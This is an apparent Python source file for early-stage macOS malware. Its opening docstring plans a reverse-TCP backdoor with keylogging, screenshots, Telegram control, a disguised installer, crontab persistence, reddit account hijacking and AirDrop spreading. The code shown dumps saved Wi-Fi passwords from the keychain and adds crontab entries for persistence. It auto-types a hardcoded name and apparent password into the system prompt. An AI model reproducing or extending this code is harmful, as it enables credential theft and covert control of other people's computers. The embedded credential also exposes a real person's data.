'''
SLAVE - MASTER
Reverse TCP to the Master on startup
or
Allow incoming connections from Master

Features:
Screenshot
Keylogging
SSH
Master accessible from Telegram
Package under a different app/dmg and then on initial run, attach self to crontab
Maybe get their reddit accounts to run a bot upvote

An initial file, when executed, dispatches crontabs and whatnot and etc etc

crontab crontab.txt, which will simply import the crontab entries from the file crontab.txt
So read crontab, and then append to it

maybe try spreading it via airdrop as well.
'''



#os.system('security find-generic-password -ga "VIRUS" | grep "password:"')
#os.system('security find-generic-password -wga "VIRUS"')

#print(network[network.index('SSIDString = ')+len('SSIDString = '):].strip('"'))


# Get all previously connected networks and their wifi passwords.
import os
import threading
import time

import pyautogui

def get_wifi_networks():
    command = 'defaults read /Library/Preferences/SystemConfiguration/com.apple.airport.preferences | grep SSIDString'
    networks = os.popen(command).read().split(';')
    for i in range(len(networks)):
        try:
            networks[i] = networks[i][networks[i].index('SSIDString = ') + len('SSIDString = '):].strip('"')
        except:
            networks.remove(networks[i])
    return networks

def get_wifi_password(ssid):
    pw = os.popen('security find-generic-password -wga {}'.format(ssid)).read()

    print(pw)
    return pw

def add_crontab(crontab):
    prev = os.popen('crontab -l')
    # create a crontab.txt file
    f = open('crontab.txt', 'w')
    f.write(prev)
    f.write(crontab)
    os.popen('crontab crontab.txt')
    os.popen('rm crontab.txt')
    return os.popen('crontab -l')


def f1():
    time.sleep(0.5)
    pyautogui.write('Kaushik Kannan')
    pyautogui.press('tab')
    pyautogui.write('kk1032643')
    pyautogui.press('enter')
    time.sleep(0.5)

def pwn():
    for network in ['VIRUS', 'Anrdh']:
        x = threading.Thread(target=get_wifi_password, args=(network,))
        y = threading.Thread(target=f1)
        y.start()
        x.start()
        time.sleep(2)


